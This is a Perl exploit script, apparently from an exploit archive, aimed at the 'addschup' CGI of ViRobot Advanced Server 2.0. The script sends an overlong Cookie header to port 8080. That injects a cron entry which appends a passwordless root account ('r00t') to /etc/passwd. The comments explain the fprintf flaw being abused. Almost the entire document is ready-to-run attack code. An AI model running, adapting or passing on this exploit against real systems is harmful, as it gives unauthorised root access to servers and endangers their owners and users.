<html><head><title>ViRobot Advanced Server 2.0 (addschup) Remote Cookie Exploit</title></head><pre>#!/usr/bin/perl
# ViRobot 2.0 remote cookie exploit - ala addschup
# copyright Kevin Finisterre kf_lists[at]digitalmunition[dot]com
#
# jdam:/home/kfinisterre# ls -al /var/spool/cron/root
# ls: /var/spool/cron/root: No such file or directory
# jdam:/home/kfinisterre# ls -al /var/spool/cron/root
# -rw-r--r--  1 root staff 104 2005-01-23 14:43 /var/spool/cron/root
#
# We control the 6th paramater passed to an fprintf call.
#
# 0x804a740 &lt;_IO_stdin_used+572&gt;:  &quot;%s %s %s %s %s %s/%s/vrupdate -s &gt; /dev/null 2&gt;&amp;1\n&quot;
#
# * * * * * /bin/echo r00t::0:0:root:/root:/bin/bash &gt;&gt; /etc/passwd &amp;/ViRobot/vrupdate -s &gt; /dev/null 2&gt;&amp;1


use IO::Socket;
$hostName = $ARGV[0];

$sock = IO::Socket::INET-&gt;new (
               Proto =&gt; &quot;tcp&quot;,
               PeerAddr =&gt; $hostName,
               PeerPort =&gt; 8080,
               Type =&gt; SOCK_STREAM
);

if (! $sock)
{
       print &quot;[*] Error, could not connect to the remote host: $!\n&quot;;
       exit (0);
}

$target = &quot;/cgi-bin/addschup&quot;;
$crondata = &quot;/bin/echo r00t::0:0:root:/root:/bin/bash &gt;&gt; /etc/passwd &amp;&quot;;
$postbody = &quot;POST $target HTTP/1.1\n&quot; .
&quot;Host: localhost:8080\n&quot; .
&quot;User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.3) Gecko/20041007 Debian/1.7.3-5\n&quot; .
&quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\n&quot; .
&quot;Accept-Encoding: gzip,deflate\n&quot; .
&quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n&quot; .
&quot;Keep-Alive: 300\n&quot; .
&quot;Connection: keep-alive\n&quot; .
&quot;Content-type: application/x-www-form-urlencoded\n&quot; .
&quot;Content-length: 1\n&quot; .
&quot;Cookie: ViRobot_ID=&quot; . &quot;A&quot; x 32 . &quot;$crondata\n&quot;;

print $sock $postbody;
close ($sock);
exit (0);

# milw0rm.com [2005-06-14]</pre></html>